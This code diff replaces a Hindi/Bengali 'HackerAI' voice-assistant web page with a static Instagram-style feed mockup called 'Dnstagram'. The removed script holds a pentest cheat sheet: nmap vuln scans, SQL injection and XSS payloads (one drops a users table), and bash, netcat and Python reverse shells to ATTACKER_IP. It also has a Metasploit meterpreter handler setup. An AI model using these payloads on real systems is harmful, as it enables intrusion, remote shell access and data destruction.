@@ -1,399 +1,380 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HackerAI Voice Assistant - हिंदी/বাংলা</title>
+    <title>Dnstagram</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0c0c0c, #1a1a2e, #16213e);
-            color: #00ff88;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #121212;
+            color: #ffffff;
+            overflow-x: hidden;
         }
-        .container {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 255, 136, 0.1);
-            border: 1px solid #00ff88;
-            max-width: 600px;
+
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
             width: 100%;
-            text-align: center;
+            height: 60px;
+            background: rgba(18, 18, 18, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid #2a2a2a;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
         }
-        h1 {
-            font-size: 2.2em;
-            margin-bottom: 20px;
-            background: linear-gradient(45deg, #00ff88, #00d4ff);
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #8b5cf6, #ec4899);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-        .status {
-            font-size: 1.2em;
-            margin: 20px 0;
-            padding: 15px;
-            border-radius: 10px;
-            background: rgba(0, 255, 136, 0.1);
-            border-left: 4px solid #00ff88;
+
+        .header-icons {
+            display: flex;
+            gap: 20px;
         }
-        .voice-btn {
-            background: linear-gradient(45deg, #00ff88, #00d4ff);
-            color: #000;
+
+        .icon-btn {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: rgba(138, 92, 246, 0.2);
             border: none;
-            padding: 20px 40px;
-            font-size: 1.5em;
-            border-radius: 50px;
+            color: #ffffff;
             cursor: pointer;
-            margin: 20px;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
-            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            transition: all 0.2s;
         }
-        .voice-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 15px 40px rgba(0, 255, 136, 0.5);
+
+        .icon-btn:hover {
+            background: rgba(138, 92, 246, 0.4);
+            transform: scale(1.1);
         }
-        .voice-btn.listening {
-            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        .chat-container {
-            margin-top: 30px;
-            max-height: 400px;
+
+        /* Main Content */
+        .main-content {
+            padding-top: 60px;
+            max-width: 470px;
+            margin: 0 auto;
+            background: #121212;
+            height: 100vh;
             overflow-y: auto;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 15px;
-            padding: 20px;
-            text-align: left;
         }
-        .message {
-            margin: 10px 0;
-            padding: 12px 18px;
-            border-radius: 15px;
-            max-width: 90%;
+
+        /* Stories */
+        .stories {
+            padding: 15px 20px;
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            scrollbar-width: none;
         }
-        .user-msg {
-            background: rgba(0, 212, 255, 0.2);
-            margin-left: auto;
-            text-align: right;
+
+        .stories::-webkit-scrollbar {
+            display: none;
         }
-        .ai-msg {
-            background: rgba(0, 255, 136, 0.2);
-            margin-right: auto;
+
+        .story {
+            flex: 0 0 75px;
+            text-align: center;
         }
-        .lang-selector {
-            margin: 20px 0;
+
+        .story-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 3px solid #8b5cf6;
+            margin-bottom: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
         }
-        select {
-            background: #00ff88;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 25px;
-            font-size: 1em;
+
+        .story-avatar:hover {
+            transform: scale(1.05);
+            border-width: 4px;
+        }
+
+        .story-name {
+            font-size: 12px;
+            color: #b4b4b4;
+        }
+
+        /* Posts */
+        .post {
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .post-header {
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .post-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ec4899, #8b5cf6);
+        }
+
+        .post-info h4 {
+            font-size: 14px;
+            margin-bottom: 2px;
+        }
+
+        .post-info p {
+            font-size: 12px;
+            color: #b4b4b4;
+        }
+
+        .post-image {
+            width: 100%;
+            height: 470px;
+            background-size: cover;
+            background-position: center;
             cursor: pointer;
         }
-        .commands {
-            background: rgba(255, 107, 107, 0.1);
-            padding: 20px;
-            border-radius: 15px;
-            margin-top: 20px;
-            font-size: 0.9em;
+
+        .post-actions {
+            padding: 15px 20px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .action-btn {
+            width: 24px;
+            height: 24px;
+            border: none;
+            background: none;
+            cursor: pointer;
+            color: #ffffff;
+            transition: all 0.2s;
+        }
+
+        .action-btn.liked {
+            color: #ef4444;
+        }
+
+        .action-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .post-caption {
+            padding: 0 20px 15px;
+        }
+
+        .post-caption strong {
+            color: #ffffff;
+        }
+
+        .post-time {
+            font-size: 12px;
+            color: #b4b4b4;
+            padding: 0 20px 15px;
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            height: 60px;
+            background: rgba(18, 18, 18, 0.95);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid #2a2a2a;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .nav-item {
+            text-align: center;
+            cursor: pointer;
+            padding: 5px;
+            transition: all 0.2s;
+        }
+
+        .nav-item.active {
+            color: #8b5cf6;
+        }
+
+        .nav-item:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Tabs */
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🛡️ HackerAI Voice Agent 🛡️</h1>
-        <div class="status" id="status">माइक के लिए बोलो या बटन दबाओ...</div>
-        
-        <div class="lang-selector">
-            <label>भाषा चुनें: </label>
-            <select id="language">
-                <option value="hi">हिंदी</option>
-                <option value="bn">বাংলা</option>
-                <option value="en">English</option>
-            </select>
+    <div class="header">
+        <div class="logo">Dnstagram</div>
+        <div class="header-icons">
+            <button class="icon-btn">+</button>
+            <button class="icon-btn">❤️</button>
+            <button class="icon-btn">✈️</button>
+            <button class="icon-btn">📩</button>
         </div>
+    </div>
 
-        <button class="voice-btn" id="voiceBtn">🎤 बोलो / Voice</button>
-        
-        <div class="chat-container" id="chatContainer"></div>
-        
-        <div class="commands">
-            <strong>कमांड्स:</strong> "nmap scan करो", "sql injection payload दो", "reverse shell generate करो", 
-            "web pentest steps बताओ", "burp suite config", "metasploit commands"...
+    <div class="main-content">
+        <!-- Stories Tab -->
+        <div id="stories-tab" class="tab-content active">
+            <div class="stories">
+                <div class="story">
+                    <div class="story-avatar" style="background: linear-gradient(45deg, #ff6b6b, #feca57);"></div>
+                    <div class="story-name">Your Story</div>
+                </div>
+                <div class="story">
+                    <div class="story-avatar" style="background: linear-gradient(45deg, #8b5cf6, #ec4899);"></div>
+                    <div class="story-name">username1</div>
+                </div>
+                <div class="story">
+                    <div class="story-avatar" style="background: linear-gradient(45deg, #48cae4, #023e8a);"></div>
+                    <div class="story-name">friend2</div>
+                </div>
+                <div class="story">
+                    <div class="story-avatar" style="background: linear-gradient(45deg, #06ffa5, #00d4aa);"></div>
+                    <div class="story-name">coolguy3</div>
+                </div>
+                <div class="story">
+                    <div class="story-avatar" style="background: linear-gradient(45deg, #ff9a9e, #fecfef);"></div>
+                    <div class="story-name">travelgirl</div>
+                </div>
+            </div>
+
+            <!-- Posts -->
+            <div class="post">
+                <div class="post-header">
+                    <div class="post-avatar"></div>
+                    <div class="post-info">
+                        <h4>username1</h4>
+                        <p>Delhi, India</p>
+                    </div>
+                </div>
+                <div class="post-image" style="background-image: url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=470&q=80');"></div>
+                <div class="post-actions">
+                    <button class="action-btn liked">❤️</button>
+                    <button class="action-btn">💬</button>
+                    <button class="action-btn">📤</button>
+                    <button class="action-btn">✈️</button>
+                </div>
+                <div class="post-caption">
+                    <strong>username1</strong> Amazing sunset view! 🌅 #travel #sunset
+                </div>
+                <div class="post-time">2 hours ago</div>
+            </div>
+
+            <div class="post">
+                <div class="post-header">
+                    <div class="post-avatar" style="background: linear-gradient(45deg, #48cae4, #023e8a);"></div>
+                    <div class="post-info">
+                        <h4>friend2</h4>
+                        <p>Mumbai</p>
+                    </div>
+                </div>
+                <div class="post-image" style="background-image: url('https://images.unsplash.com/photo-1519046904884-53103b34b206?ixlib=rb-4.0.3&auto=format&fit=crop&w=470&q=80');"></div>
+                <div class="post-actions">
+                    <button class="action-btn">❤️</button>
+                    <button class="action-btn">💬</button>
+                    <button class="action-btn">📤</button>
+                </div>
+                <div class="post-caption">
+                    <strong>friend2</strong> Coffee time ☕ #coffee #morning
+                </div>
+                <div class="post-time">5 hours ago</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="nav-item active" data-tab="stories-tab">
+            <div>🏠</div>
+            <div style="font-size: 12px;">Home</div>
+        </div>
+        <div class="nav-item" data-tab="reels-tab">
+            <div>🎬</div>
+            <div style="font-size: 12px;">Reels</div>
+        </div>
+        <div class="nav-item" data-tab="shop-tab">
+            <div>🛍️</div>
+            <div style="font-size: 12px;">Shop</div>
+        </div>
+        <div class="nav-item" data-tab="igtv-tab">
+            <div>📺</div>
+            <div style="font-size: 12px;">IGTV</div>
+        </div>
+        <div class="nav-item" data-tab="profile-tab">
+            <div>👤</div>
+            <div style="font-size: 12px;">Profile</div>
         </div>
     </div>
 
     <script>
-        class HackerAIVoiceAgent {
-            constructor() {
-                this.recognition = null;
-                this.synthesis = window.speechSynthesis;
-                this.isListening = false;
-                this.currentLang = 'hi';
-                this.chatHistory = [];
-                
-                this.initSpeechRecognition();
-                this.bindEvents();
-                this.welcomeMessage();
-            }
+        // Tab switching
+        const navItems = document.querySelectorAll('.nav-item');
+        const tabContents = document.querySelectorAll('.tab-content');
 
-            initSpeechRecognition() {
-                if ('webkitSpeechRecognition' in window) {
-                    this.recognition = new webkitSpeechRecognition();
-                    this.recognition.continuous = true;
-                    this.recognition.interimResults = false;
-                    this.recognition.lang = 'hi-IN';
-                } else if ('SpeechRecognition' in window) {
-                    this.recognition = new SpeechRecognition();
-                    this.recognition.continuous = true;
-                    this.recognition.interimResults = false;
-                    this.recognition.lang = 'hi-IN';
-                }
+        navItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const targetTab = item.dataset.tab;
                 
-                if (this.recognition) {
-                    this.recognition.onstart = () => this.onListeningStart();
-                    this.recognition.onresult = (e) => this.onSpeechResult(e);
-                    this.recognition.onerror = (e) => this.onSpeechError(e);
-                    this.recognition.onend = () => this.onListeningEnd();
-                }
-            }
+                // Update active nav
+                navItems.forEach(nav => nav.classList.remove('active'));
+                item.classList.add('active');
+                
+                // Update active tab
+                tabContents.forEach(tab => tab.classList.remove('active'));
+                document.getElementById(targetTab)?.classList.add('active');
+            });
+        });
 
-            bindEvents() {
-                document.getElementById('voiceBtn').addEventListener('click', () => {
-                    this.toggleListening();
-                });
-                
-                document.getElementById('language').addEventListener('change', (e) => {
-                    this.currentLang = e.target.value;
-                    this.recognition.lang = this.currentLang === 'hi' ? 'hi-IN' : 
-                                           this.currentLang === 'bn' ? 'bn-IN' : 'en-US';
+        // Like button toggle
+        document.querySelectorAll('.action-btn').forEach(btn => {
+            if (btn.textContent === '❤️') {
+                btn.addEventListener('click', (e) => {
+                    e.target.classList.toggle('liked');
                 });
             }
+        });
 
-            toggleListening() {
-                if (!this.isListening) {
-                    this.startListening();
-                } else {
-                    this.stopListening();
-                }
-            }
-
-            startListening() {
-                if (this.recognition) {
-                    this.recognition.start();
-                    this.isListening = true;
-                }
-            }
-
-            stopListening() {
-                if (this.recognition) {
-                    this.recognition.stop();
-                    this.isListening = false;
-                }
-            }
-
-            onListeningStart() {
-                document.getElementById('status').textContent = '🎤 सुन रहा हूँ... / Listening...';
-                document.getElementById('voiceBtn').classList.add('listening');
-                document.getElementById('voiceBtn').textContent = '⏹️ रुको / Stop';
-            }
-
-            onListeningEnd() {
-                document.getElementById('status').textContent = 'माइक के लिए बोलो या बटन दबाओ...';
-                document.getElementById('voiceBtn').classList.remove('listening');
-                document.getElementById('voiceBtn').textContent = '🎤 बोलो / Voice';
-                this.isListening = false;
-            }
-
-            onSpeechError(e) {
-                console.error('Speech error:', e);
-                this.addMessage('❌ Voice recognition error. Browser permissions?', 'ai');
-                this.onListeningEnd();
-            }
-
-            async onSpeechResult(event) {
-                const transcript = event.results[event.results.length - 1][0].transcript;
-                console.log('Heard:', transcript);
-                
-                this.addMessage(`आप: ${transcript}`, 'user');
-                document.getElementById('status').textContent = '🤖 सोच रहा हूँ... / Processing...';
-                
-                const response = await this.generateHackerResponse(transcript);
-                this.addMessage(response.text, 'ai');
-                this.speak(response.text, this.currentLang);
-                
-                document.getElementById('status').textContent = '✅ तैयार! बोलो... / Ready!';
-            }
-
-            async generateHackerResponse(query) {
-                // Hindi/Bengali to English translation for processing
-                const englishQuery = this.translateToEnglish(query.toLowerCase());
-                
-                // Pentest knowledge base
-                const responses = {
-                    // Nmap commands
-                    'nmap': 'nmap -sC -sV -p- -A --script vuln target_ip\nnmap -sS -T4 -O target_ip\nnmap --script http-vuln* target_ip',
-                    
-                    // SQL Injection
-                    'sql injection': `SQLi Payloads:
-1. ' OR 1=1 --
-2. 1'; DROP TABLE users; --
-3. UNION SELECT username,password FROM users--
-4. admin' --
-Burp Intruder: Fuzz payload positions`,
-                    
-                    // XSS
-                    'xss': `<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-"'><script>alert(1)</script>
-Payload list: https://github.com/payloadbox/xss-payload-list`,
-                    
-                    // Reverse Shells
-                    'reverse shell': `Bash: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-Netcat: nc -e /bin/sh ATTACKER_IP 4444
-Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'`,
-                    
-                    // Metasploit
-                    'metasploit': `msfconsole
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST YOUR_IP
-set LPORT 4444
-exploit -j`,
-                    
-                    // Burp Suite
-                    'burp': `Proxy: 127.0.0.1:8080
-Repeater: Ctrl+R
-Intruder: Fuzz positions with §
-Scanner: Active/Passive scan
-Collaborator: External interactions`,
-                    
-                    // Default hacker help
-                    'default': `मैं तुम्हारा HackerAI agent हूँ! पूछो:
-• Nmap scanning commands
-• SQLi/XSS payloads  
-• Reverse shell generation
-• Burp Suite workflows
-• Metasploit modules
-• Privilege escalation
-• Web pentest methodology
-कुछ specific बोलो!`
-                };
-
-                // Find matching response
-                for (let key in responses) {
-                    if (englishQuery.includes(key)) {
-                        return {
-                            text: this.translateResponse(responses[key], this.currentLang),
-                            category: key
-                        };
-                    }
-                }
-
-                return {
-                    text: this.translateResponse(responses['default'], this.currentLang),
-                    category: 'general'
-                };
-            }
-
-            translateToEnglish(hindiText) {
-                // Simple keyword mapping (expand as needed)
-                const map = {
-                    'nmap': 'nmap', 'scan': 'scan', 'sql': 'sql injection',
-                    'injection': 'sql injection', 'xss': 'xss',
-                    'shell': 'reverse shell', 'reverse': 'reverse shell',
-                    'burp': 'burp', 'metasploit': 'metasploit',
-                    'payload': 'payload', 'exploit': 'exploit'
-                };
-                return Object.keys(map).find(key => hindiText.includes(key)) || 'default';
-            }
-
-            translateResponse(text, lang) {
-                const hindiTranslations = {
-                    'default': `मैं HackerAI agent हूँ! ये commands बोलो:
-• "nmap scan"
-• "sql injection payload" 
-• "reverse shell"
-• "xss payloads"
-• "burp suite config"
-Specific pentest technique बताओ! 🚀`
-                };
-                
-                const bengaliTranslations = {
-                    'default': `আমি তোমার HackerAI agent! এই কমান্ড বলো:
-• "nmap scan" 
-• "sql injection payload"
-• "reverse shell"
-• "xss payloads"
-নির্দিষ্ট pentest technique বলো! 🚀`
-                };
-
-                if (lang === 'hi') return hindiTranslations['default'] || text;
-                if (lang === 'bn') return bengaliTranslations['default'] || text;
-                return text;
-            }
-
-            addMessage(text, sender) {
-                const chat = document.getElementById('chatContainer');
-                const msg = document.createElement('div');
-                msg.className = `message ${sender}-msg`;
-                msg.textContent = text;
-                chat.appendChild(msg);
-                chat.scrollTop = chat.scrollHeight;
-            }
-
-            speak(text, lang) {
-                if ('speechSynthesis' in window) {
-                    const utterance = new SpeechSynthesisUtterance(text);
-                    utterance.lang = lang === 'hi' ? 'hi-IN' : lang === 'bn' ? 'bn-IN' : 'en-US';
-                    utterance.rate = 0.9;
-                    utterance.pitch = 1;
-                    this.synthesis.speak(utterance);
-                }
-            }
-
-            welcomeMessage() {
+        // Story click animation
+        document.querySelectorAll('.story-avatar').forEach(avatar => {
+            avatar.addEventListener('click', () => {
+                avatar.style.transform = 'scale(0.95)';
                 setTimeout(() => {
-                    this.addMessage('नमस्ते! मैं HackerAI Voice Agent हूँ। Pentesting में मदद करूँगा। 🎤 बोलो!', 'ai');
-                    this.speak('Namaste! Main HackerAI voice agent hoon. Pentesting mein madad karunga. Bolo!', 'hi');
-                }, 1000);
-            }
-        }
-
-        // Initialize when page loads
-        window.addEventListener('load', () => {
-            new HackerAIVoiceAgent();
+                    avatar.style.transform = '';
+                }, 150);
+            });
         });
 
-        // Handle visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                // Pause recognition when tab is hidden
-                const agent = window.hackerAgent;
-                if (agent && agent.isListening) {
-                    agent.stopListening();
-                }
-            }
-        });
+        // Smooth scrolling
+        document.querySelector('.main-content').style.scrollBehavior = 'smooth';
     </script>
 </body>
 </html>
